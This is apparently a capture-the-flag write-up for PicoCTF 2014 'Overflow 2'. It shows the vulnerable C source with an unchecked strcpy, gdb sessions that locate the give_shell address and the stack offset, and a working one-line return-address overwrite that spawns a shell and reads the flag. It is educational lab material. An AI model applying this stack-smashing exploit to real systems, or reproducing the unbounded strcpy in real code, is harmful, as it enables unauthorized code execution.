# Pico-CTF 2014: Overflow 2

**Category:** Binary Exploitation
**Points:** 70
**Total Solves:** Not Available
## Problem Description:
[//]: # (Description of your problem. For eg use below description as a template)
[//]: # (> This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at /home/format/ on the shell server. The source can be found [here](format.c\).)
> This problem has a buffer overflow vulnerability! Can you get a shell? You can solve this problem interactively here, and the source can be found [here](overflow2.c).

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* This never gets called! */
void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void vuln(char *input){
    char buf[16];
    strcpy(buf, input);
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
```

## Write-up
[//]: # (> Your write up goes here.)
> There is a buffer overflow vulnerability in this c program, the argument passed as string is directly getting copied to variable buf withou checking any bounds in function vuln().

```c
void vuln(char *input){
    char buf[16];
    strcpy(buf, input);
}
```
> If we give input more than 16 character strcpy will start overriding the stack.
To get the flag we need to call function give_shell(), in order to do so we can override stack of vuln function so that when its execution finishes control goes to give_shell() function. 
So, first we need to figure out the address of function give_shell(). Fot that we can use gdb.

```bash
pico74093@shell:/home/overflow2$ gdb overflow2
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from overflow2...(no debugging symbols found)...done.
(gdb) p &give_shell
$1 = (<text variable, no debug info> *) 0x80484ad <give_shell>
(gdb)
```

> Now we have address of function to write on stack of function vuln() we need figure out how much char we need to write on stack using strcpy so that address of give_shell() `x80484ad` get written at exact place, which just after 4 bytes after the address stored at`EBP`. Why because EBP stores the BP (Base pointer) of previous caller function, in this can main but we want it to be give_shell(). To figure out the lngth of char string which we are going to pass we can pass randowm characters like "aaaaa" and see how much far it is from address stored at register EBP.

```
(gdb) p &vuln
$2 = (<text variable, no debug info> *) 0x80484e2 <vuln>
(gdb) disassemble vuln
Dump of assembler code for function vuln:
   0x080484e2 <+0>:     push   %ebp
   0x080484e3 <+1>:     mov    %esp,%ebp
   0x080484e5 <+3>:     sub    $0x28,%esp
   0x080484e8 <+6>:     mov    0x8(%ebp),%eax
   0x080484eb <+9>:     mov    %eax,0x4(%esp)
   0x080484ef <+13>:    lea    -0x18(%ebp),%eax
   0x080484f2 <+16>:    mov    %eax,(%esp)
   0x080484f5 <+19>:    call   0x8048360 <strcpy@plt>
   0x080484fa <+24>:    leave
   0x080484fb <+25>:    ret
End of assembler dump.
(gdb) b *0x080484fa
Breakpoint 1 at 0x80484fa
(gdb) r "aaaaaa"
Starting program: /home/overflow2/overflow2 "aaaaaa"

Breakpoint 1, 0x080484fa in vuln ()
(gdb) x /x $ebp-24
0xffffd6a0:     0x61616161
(gdb) x /x $ebp-23
0xffffd6a1:     0x61616161
(gdb) x /x $ebp-25
0xffffd69f:     0x61616108
(gdb) x /x $ebp-26
0xffffd69e:     0x61610804
(gdb)
```

> From above we can see that we need to pass more than 24 charcters to overwrite the content stored at address stored at register EBP. We need to also overwrite the returning adddress, so our string to passed as argument can be: `aaaaaaaaaaaaaaaaaaaaaaaaaaaa\xad\x84\x04\x08`. Here address is in reverese order because machine is little endian.
We can execute the binary as:

```bash
pico74093@shell:/home/overflow2$ ./overflow2 $(python -c 'print "a"*28 + "\xad\x84\x04\x08"')
$ whoami
pico74093
$ cat flag.txt
controlling_%eip_feels_great
```

> Flag is **controlling_%eip_feels_great**

## Other write-ups and resources

* None
